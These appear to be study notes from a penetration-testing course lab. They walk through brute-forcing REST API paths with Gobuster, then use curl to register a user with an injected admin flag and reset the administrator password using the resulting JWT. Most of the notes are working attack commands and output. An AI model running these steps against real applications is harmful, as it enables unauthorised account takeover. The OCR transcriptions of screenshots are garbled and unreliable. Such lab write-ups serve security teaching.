---
tags:
  - api
  - web
---

# Enumerating and Abusing APIs

In many cases, our penetration test target is an internally built, closed-source web application that is shipped with a number of Application Programming Interfaces (API). These APIs are responsible for interacting with the back-end logic and providing a solid backbone of functions to the web application.

A specific type of API named Representational State Transfer (REST) is used for a variety of purposes, including authentication.

In a typical white-box test scenario, we would receive complete API documentation to help us fully map the attack surface. However, when performing a black-box test, we'll need to discover the target's API ourselves.

We can use Gobuster features to brute force the API endpoints. In this test scenario, our API gateway web server is listening on port 5001 on 192.168.50.16, so we can attempt a directory brute force attack.

API paths are often followed by a version number, resulting in a pattern such as:



The API name is often quite descriptive about the feature or data it uses to operate, followed directly by the version number.

With this information, let's try brute forcing the API paths using a wordlist along with the pattern Gobuster feature. We can call this feature by using the -p option and providing a file with patterns. For our test, we'll create a simple pattern file on our Kali system containing the following text:




In this example, we are using the "{GOBUSTER}" placeholder to match any word from our wordlist, which will be appended with the version number. To keep our test simple, we'll try with only two versions.






Let's first inspect the /users API with curl.










Interestingly, instead of a 404 Not Found response code, we received a 405 METHOD NOT ALLOWED, implying that the requested URL is present, but that our HTTP method is unsupported. By default, curl uses the GET method when it performs requests, so we could try interacting with the password API through a different method, such as POST or PUT.

Both POST and PUT methods, if permitted on this specific API, could allow us to override the user credentials (in this case, the administrator password).

Before attempting a different method, let's verify if the overwritten credentials are accepted. We can check if the login method is supported by extending our base URL as follows:





Although we were presented with a 404 NOT FOUND message, the status message states that the user has not been found; another clear sign that the API itself exists. We only need to find a proper way to interact with it.

We know one of the usernames is admin, so we can attempt a login with this username and a dummy password to verify that our strategy makes sense.

Next, we will try to convert the above GET request into a POST and provide our payload in the required JSON format. Let's craft our request by first passing the admin username and dummy password as JSON data via the -d parameter. We'll also specify "json" as the "Content-Type" by specifying a new header with -H.




Since we don't know admin's password, let's try another route and check whether we can register as a new user. This might lead to a different attack surface.

Let's try registering a new user with the following syntax by adding a JSON data structure that specifies the desired username and password:










We were able to correctly sign in and retrieve a JSON Web Token (JWT) authentication token. To obtain tangible proof that we are an administrative user, we should use this token to change the admin user password.




Unfortunately, the application indicates that the HTTP method is unsupported, so we’ll try an alternative. The PUT method (along with PATCH) is often used to replace a value as opposed to creating one via a POST request, so let's try to explicitly define it next:







These kind of programming mistakes happen to various degrees when building web applications that rely on custom APIs, often due to lack of testing and secure coding best practices.

So far, we have relied on curl to manually assess the target's API so that we could get a better sense of the entire traffic flow.

This approach, however, will not properly scale whenever the number of APIs becomes significant. Luckily, we can recreate all the above steps from within Burp.

As an example, let's replicate the latest admin login attempt and send it to the proxy by appending the --proxy 127.0.0.1:8080 to the command. Once done, from Burp's Repeater tab, we can create a new empty request and fill it with the same data as we did previously.



Great! We were able to recreate the same behavior within our proxy, which, among other advantages, enables us to store any tested APIs in its database for later investigation.

Once we've tested several different APIs, we could navigate to the Target tab and then Site map. We can then retrieve the entire map of the paths we have been testing so far.

> [!note]- Screenshot
> ```
> Japi_name/v1
> Listing 8 - API Path Naming Convention
> ```


> [!note]- Screenshot
> ```
> {GOBUSTER}/v1.
> {GOBUSTER}/v2
> Listing 9 - Gobuster pattern
> ```


```sh
{GOBUSTER}/v1
{GOBUSTER}/v2
```


> [!note]- Screenshot
> ```
> We are now ready to enumerate the API with gobuster using the following command:
> kaligkali:~$ gobuster dir -u http://192.168.50.16:5002 -w
> Jusr/share/wordlists/dirb/big.txt -p pattern
> Gobuster v3.1.0
> by 03 Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
> 
> [+] url: http://192.168.50.16:5001
> [+] Method: GET
> [+] Threads: 10
> [+] wordlist: Jusr/share/wordlists/dirb/big.txt
> [+] Patterns: pattern (1 entries)
> [+] Negative Status codes: 404
> [+] User agent: gobuster/3.1.0
> [+] Timeout: 10s
> 2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
> 7books/v1 (Status: 200) [Size: 235]
> /console (Status: 200) [Size: 1985]
> Jui (Status: 3@8) [Size: 265] [--> http://192.168.50.16:5001/ui/]
> Jusers/v1 (Status: 200) [Size: 241]
> Listing 10 - Bruteforcing API Paths
> 
> We discovered multiple hits, including two interesting entries that seem to be API
> 
> endpoints, /books/v1 and /users/v1.
> ```


```sh
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```


> [!note]- Screenshot
> ```
> Q Tip
> 
> If we browse to the /ui path, we'll discover the entire APIs' documentation. Although
> this is common during white-box testing, is not a luxury we normally have during a
> black-box test.
> ```


> [!note]- Screenshot
> ```
> kaligkali:~§ curl -i http://192.168.50.16:5002/users/v1
> HTTP/1.8 260 OK
> Content-Type: application/json
> Content-Length: 241
> Server: Werkzeug/1.0.1 Python/3.7.13
> Date: Wed, @6 Apr 2022 09:27:5@ GMT
> {
> vusers": [
> {
> “email”: “maili@mail.com”,
> “username”: “namei”
> bh
> {
> “email”: "mail2@mail.com”,
> “username”: “name2”
> bh
> {
> “email”: “admingmail.com”,
> “username”: “admin”
> +
> ]
> 3
> TEC aE
> The application returned three user accounts, including an administrative account that
> seems to be worth further investigation. We can use this information to launch another
> Gobuster-based brute force attack, this time targeting the admin user with a smaller
> wordlist. To verify if any further API property is related to the username property, we'll
> expand the API path by inserting the admin username at the very end.
> ```


```sh
curl -i http://192.168.50.16:5002/users/v1
```


> [!note]- Screenshot
> ```
> kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w
> /usr/share/wordlists/dirb/smal1.txt
> Gobuster v3.1.0
> by 03 Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
> [4] url: http: //192.168.50.16:5001/users/v1/admin/
> [+] method: GET
> [+] Threads: 10
> [+] Wordlist: Jusr/share/wordlists/dirb/small txt
> [+] Negative Status codes: 404
> [+] User agent: gobuster/3.1.0
> [+] Timeout: 10s
> 2022/04/06 6:40:12 Starting gobuster in directory enumeration mode
> Jemail (Status: 405) [Size: 142]
> Jpassword (Status: 405) [Size: 142]
> 2022/04/06 06:40:35 Finished
> Listing 12 - Discovering extra APIs
> ```


```sh
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```


> [!note]- Screenshot
> ```
> The password API path seems enticing for our testing purposes, so we'll probe it via
> curl.
> kaligkali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
> HTTP/1. 405 METHOD NOT ALLOWED
> Content-Type: application/problem+json
> Content-Length: 142
> Server: Werkzeug/1.0.1 Python/3.7.13
> Date: Wed, @6 Apr 2022 10:58:51 GMT
> {
> “detail”: “The method is not allowed for the requested URL.”,
> “status”: 405,
> “title: "Method Not Allowed",
> “type”: “about:blank”
> 3
> Listing 13 - Discovering API unsupported methods
> ```


```sh
curl -i http://192.168.50.16:5002/users/v1/admin/password
```


> [!note]- Screenshot
> ```
> kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
> HTTP/1.0 484 NOT FOUND
> Content-Type: application/json
> Content-Length: 48
> Server: Werkzeug/1.0.1 Python/3.7.13
> Date: Wed, @6 Apr 2022 12:04:30 GMT
> { “status”: "fail", “message”: “User not found"}
> Listing 14 - Inspecting the ‘login' API
> ```


```sh
curl -i http://192.168.50.16:5002/users/v1/login
```


> [!note]- Screenshot
> ```
> kaligkali:~§ curl -d ‘{"password": "fake", "username": "admin"}" -H ‘Content-Type:
> application/json’ http://192.168.50.16:5002/users/v1/login
> { “status”: “fail”, “message”: “Password is not correct for the given username."}
> Listing 15 - Crafting a POST request against the login API
> The API return message shows that the authentication failed, meaning that the API
> parameters are correctly formed.
> ```


```sh
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```


> [!note]- Screenshot
> ```
> kali@kali:~$ curl -d *{"password”:"lab™, "username": "offsecadmin"}’ -H ‘Content-Type:
> application/json’ http: //192.168.50.16:5002/users/vi/register
> { “status”: “fail”, “message”: “‘email’ is a required property"}
> 
> Listing 16 - Attempting new User Registration
> ```


```sh
curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
```


> [!note]- Screenshot
> ```
> The API replied with a "fail" message stating that we should also include an email
> address. We could take this opportunity to determine if there's any administrative key
> we can abuse. Let's add the admin key, followed by a True value.
> 
> kali@kali:~$ curl -d
> 
> “password”: “lab”, “username”: “of fsec”, "email" :"pun@offsec.com™, "admin" :"True"}" -H
> 
> “Content-Type: application/json’ http://192.168.50.16:5002/users/vi/register
> 
> {"message": “Successfully registered. Login to receive an auth token.”, “status”:
> 
> “success”}
> 
> Listing 17 - Attempting to register a new user as admin
> ```


```sh
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
```


> [!note]- Screenshot
> ```
> Since we received no error, it seems we were able to successfully register a new user
> as an admin, which should not be permitted by design. Next, let's try to log in with the
> credentials we just created by invoking the login API we discovered earlier.
> 
> kali@kali:~$ curl -d *{"password”: "lab", "username": "offsec"}" -H “Content-Type:
> 
> application/json’ http://192.168.50.16:5002/users/v1/login
> 
> {"auth_token”:
> 
> “eyJ@eXAi0i IKV1QiLCIHbGCi0i IIUZTINiI9 . eyJ1eHAIOJENDkyNZEyMDEsIm1hdCI6MTYOOTI3MDkwMSwic
> 
> 3ViTjoib2Zmc2Vj1n0.MYbSaiBkYpUGOTH-tw61tzH@jNABCDACR3_FdYLRkew", “message”:
> 
> “successfully logged in.", “status”: “success"}
> 
> Listing 18 - Logging in as an admin user
> 
> We were able to correctly sign in and retrieve a JSON Web Token (JWT) authentication
> token. To obtain tangible proof that we are an administrative user, we should use this
> token to change the admin user password.
> ```


```sh
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```


> [!note]- Screenshot
> ```
> We can attempt this by forging a POST request that targets the password API.
> kali@kali:~$ curl \
> “http: //192.168.50.16:5002/users/vi/admin/password’ \
> -H ‘Content-Type: application/json’ \
> -H ‘Authorization: OAuth
> eyJ0eXAi0iIKV1QiLCIhbGci0iITUZTANAI9. eyI1eHAi0jEZNDkyNzEyMDEsIm1hdCI6MTYOOTI3MDkuMSwic3
> Vil joib2zmc2VjIn0.MYbSaiBkYpUGOTH-tw61tzW@jNABCDACR3_FdYLRkew" \
> -d "{"password": “pwned”}"
> {
> “detail”: “The method is not allowed for the requested URL.”,
> “status”: 405,
> “title”: "Method Not Allowed”,
> “type”: “about:blank”
> 3
> Listing 19 - Attempting to Change the Administrator Password via a POST request
> We passed the JWT key inside the Authorization header along with the new password.
> ```


```sh
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
```


> [!note]- Screenshot
> ```
> kali@kali:~$ curl -x "PUT" \
> “http: //192.168.50.16:5002/users/v1/admin/password’ \
> -H ‘Content-Type: application/json’ \
> -H ‘Authorization: OAuth
> eyJ@eXAi0i JKV1QiLCIhbGci0i ITUZT1NiJ9. ey] 1eHAi0jEZNDkyNZE30TQsIm1hdCIGMTYOOTI3MTQSNCwic3
> Viljoib2Zmc2VjIn@.0eZHirEcrZ5FOQqLb81HbII7f9KaRAkrywoaRUASgA4* \
> -d ‘{"password": "pwned"}"
> Listing 20 - Attempting to Change the Administrator Password via a PUT request
> This time we received no error message, SO we can assume the application backend
> processed the request without error. To prove that our attack succeeded, we can try
> logging in as admin using the newly changed password.
> ```


```sh
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```


> [!note]- Screenshot
> ```
> kali@kali:~$ curl -d ‘{"password”:"pwned","username”:"admin"}" -H ‘Content-Type:
> application/json’ http://192.168.50.16:5002/users/v1/login
> {"auth_token™:
> “eyJ@eXAi0iIKV10iLCIhbGci0iITUZIANiI9 . eyJ1eHALOjEZNDkyNzIxMjgs ImlhdCL6MTY@OTI3MTgyOCwic
> 3ViljoiYWRtaW4ifQ. yNgxeTUH@XLE1K95TCU8810SLP61C17usZYoZD1U100", “message”:
> “Successfully logged in.", “status”: “success"}
> Listing 21 - Successfully logging in as the admin account
> Nice! We managed to take over the admin account by exploiting a logical privilege
> escalation bug present in the registration API.
> ```


```sh
curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```


> [!note]- Screenshot
> ```
> Burp Project Intruder Repeater Window Help
> Dashboard Target Proxy —Intruder--~=—=sRepeater__~—« Sequencer =“ Decoder_-«=« Comparer
> Request
> Raw Hex =
> 1 POST /users/vi/login HITP/1.1
> Host: 192,168.50.16:5002
> Content-Type: application/json
> sf
> "password": "p ’
> “username”: “ad
> WH
> Figure 23: Crafting a POST request in Burp for API testing
> Next, we'll click on the Send button and verify the incoming response on the right pane.
> Response ais
> Pretty [ce ne
> HTTP/1.0 200 ok
> 2 Content-Type: application/json
> 3 Content-Length: 224
> Server: Werkzeug/1.0.1 Python/3.7.13
> 5 Date: Thu, 07 Apr 2022 07:10:49 GMT
> 74
> “auth_token"
> . i IKVLGALCIMBGci Oi ITUz 11 eHAd Oj E2NDkzMTUSNOksTml hd
> f NTQOOSwic3ViTj 03) if. iNandSyXLzbbd2il 139un21
> "message": " ‘ ged in."
> "status":
> +
> Figure 24: Inspecting the API response value
> ```


> [!note]- Screenshot
> ```
> up Project tnraer Repeater Window Help
> Dashboard Taget__Poay—_‘Inruder_—Repeater”—“Sequencer—Decader_——<Comparer_—Loger_—‘Eslender ‘Projections —_Useroptlons
> Sitemap Scope fase definitions
> Filter Hiéngratfunditems ng mage and generalinry omer Nang éxresponses: dng empty folders
> 
> Sin tpineneaso.esooa Post snsiegh yon ow
> 
> @ di ep926850185002 POST seein 0 an BON
> 
> @ lg eplnga_easoesoo2 ost hecahegster > bo me son
> 
> ae ep926850155002 GET Jseraigin
> p92 36850155002 GET Jseraregeer
> Figure 18: Using the Site Map to organize AP! testing
> 
> From Burp's Site map, we can track the API we discovered and forward any saved
> request to the Repeater or Intruder for further testing.
> ```
